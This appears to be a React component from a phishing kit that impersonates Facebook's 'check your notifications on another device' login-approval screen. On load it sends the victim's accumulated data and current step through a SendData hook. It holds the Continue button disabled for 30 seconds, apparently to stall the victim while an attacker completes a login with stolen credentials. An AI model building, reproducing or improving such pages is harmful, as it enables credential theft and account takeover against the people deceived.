import React, { useContext, useRef } from "react";
import styled from "styled-components";
import { useEffect } from "react";
import { Row, Col } from "react-bootstrap";
import Image from "next/image";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";

const ModalContainer = styled.div`
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  height: 100%;
  z-index: 1000;
  top: 0px;
  left: 0px;
  padding-inline: 1rem;
`;
const ModalContent = styled.div`
  max-width: 550px;
  width: 100%;
  height: 530px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  padding-block: 1.5rem;
  margin-block: 1rem;

  button:disabled {
    opacity: 0.5;
  }
`;

const ModalTitle = styled.div`
  padding-bottom: 0.1rem;
  font-weight: 700;
  font-size: 20px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const SmallText = styled.div`
  color: #1c2b33;
  font-size: 14px;
  line-height: 1.3;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`;

const CustomInput = styled.input`
  width: 100%;
  border: 1px solid #ddd;
  padding: 0.75rem;
  outline: none !important;
  border-radius: 10px;
  :focus {
    border: 1px solid #aaa;
  }
  margin-bottom: 0.5rem;
`;
const StyledButton = styled.button`
  background-color: #0064e0;
  border: 1px solid #0064e0;
  width: 100%;
  color: white;
  font-size: 13px;
  font-weight: 500;
  padding: 10px 20px;
  border-radius: 50px;
  text-transform: none;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  :disabled {
    opacity: 0.5;
  }
`;
const ErrorDiv = styled.div`
  font-size: 12px;
  color: red;
  text-align: left;
  padding-bottom: 0.5rem;
  margin-top: -0.35rem;
`;

const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 250px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) {
    min-height: 160px;
    border-radius: 10px;

    img {
      border-radius: 10px;
    }
  }
`;

const BlackCircle = styled.div`
  display: grid;
  place-items: center;
  height: 20px;
  width: 20px;
  border: 2px solid #192432;
  border-radius: 50px;
`;

function PhoneVerify({ setStep, Step, Name }) {
  const btnRef = useRef();

  const NextClicked = () => {
    setTimeout(() => {
      setStep(4);
    }, 1000);
  };

  useEffect(() => {
    btnRef.current.disabled = true;
    const timer = setTimeout(() => {
      if (Step === 10) {
        btnRef.current.disabled = false;
      }
    }, 30000);

    return () => clearTimeout(timer);
  }, []);

  let { AllData } = useContext(DataContext);

  React.useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "Phone Verify",
    };

    SendData(params);
  }, []);

  return (
    <ModalContainer>
      <ModalContent>
        <div className="text-start">
          <ModalTitle>Check your notifications on another device</ModalTitle>
          <SmallText>
            We sent a notification to your Phone or PC. Check your Facebook
            notifications there and approve the login to continue.
          </SmallText>
        </div>
        <ImgWrapper>
          <Image
            alt=""
            src="/assets/images/newPhoneVerify.jpg"
            layout="fill"
            objectFit="cover"
          />
        </ImgWrapper>
        <div>
          <Row className="gx-2">
            <Col xs={"auto"}>
              <BlackCircle className="mt-2">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="10"
                  height="10"
                  fill="currentColor"
                  viewBox="0 0 16 16"
                >
                  <path d="M3 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3m5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3m5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3" />
                </svg>
              </BlackCircle>
            </Col>
            <Col>
              <div
                style={{ fontSize: "15px", fontWeight: 500 }}
                className="pb-0 font-fbook"
              >
                Waiting for approval
              </div>
              <SmallText>
                It may take a few minutes to get the notification on your other
                device. Get a new notification
              </SmallText>
            </Col>
          </Row>

          <StyledButton onClick={NextClicked} ref={btnRef} className="mt-4">
            Continue
          </StyledButton>
        </div>
      </ModalContent>
    </ModalContainer>
  );
}

export default PhoneVerify;
